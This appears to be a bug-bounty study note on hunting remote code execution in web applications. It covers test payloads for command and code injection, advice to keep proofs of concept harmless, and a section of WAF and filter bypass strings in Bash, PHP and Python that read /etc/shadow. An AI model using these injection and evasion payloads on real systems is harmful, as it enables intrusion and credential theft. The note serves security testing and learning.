### what & how
occurs when an attacker can execute arbitrary code on a target machine because of a vulnerability (file upload, code injection, SQLi, insecure deserialization, template injection,..) or misconfiguration.
RCE is not a vuln itself but it result of exploit migration, most street forward to find is via [[code injection]]  or [[file Inclusion]]
### hunt for it
Hunting for classic RCE, Blind RCE(*reverse_shell*) is a similar process, but the commands or code snippets you’ll need to use to verify these vulnerabilities will differ.
1. Gather Information About the Target: 
	1. find out information about the web server, programming language, and other technologies used by your current target. in order to write effective payload
2. Identify Suspicious User Input Locations
	1. When hunting for code injections, take note of every direct user-input location, including URL parameters, HTTP headers, body parameters, and file uploads.
	2. find potential file inclusion vulnerabilities, check for input locations being used to determine filenames or paths, as well as any file-upload functionalities in the application
3. Submit Test Payloads
	1. python `print('RCE')`, `"__import__('os').system('ls;sleep 15')"`
	2. unix `| sleep(10)`, `;ls;`, `&sleep(10)`, `$(sleep(5))`
###### Don't Escalating the Attack 
if u get RCE in a bug bounty program, don't try system privilege escalation, cuz You might accidentally read sensitive file or cause damage to the systems. always read program policy
just run `cat /etc/passwd`, `touch rce_demrt.txt`, for blind `sleep` 
When you create your POC, make sure that your payload executes a harmless command and that your report describes the steps needed to achieve RCE. Often, reading a non-sensitive file or creating a file under a random path is enough to prove your findings
### Bypass Protection
for command injection try
```bash
cat /etc/shadow 
cat "/e"tc'/shadow' 
cat /etc/sh*dow 
cat /etc/sha``dow 
cat /etc/sha$()dow 
cat /etc/sha${}dow
```
for code injection
```php
system('cat /etc/shadow');
('sys'.'tem')('cat /etc/shadow');
system/**/('ls');
'\x73\x79\x73\x74\x65\x6d'('ls');
```
```python
__import__('os').system('cat /etc/shadow')
__import__('o'+'s').system('cat /etc/shadow')
__import__('\x6f\x73').system('cat /etc/shadow')
```
u can bypass WAF by split your payload 
```
GET /calculator?calc="__import__('os').sy"&calc="stem('ls')"
```
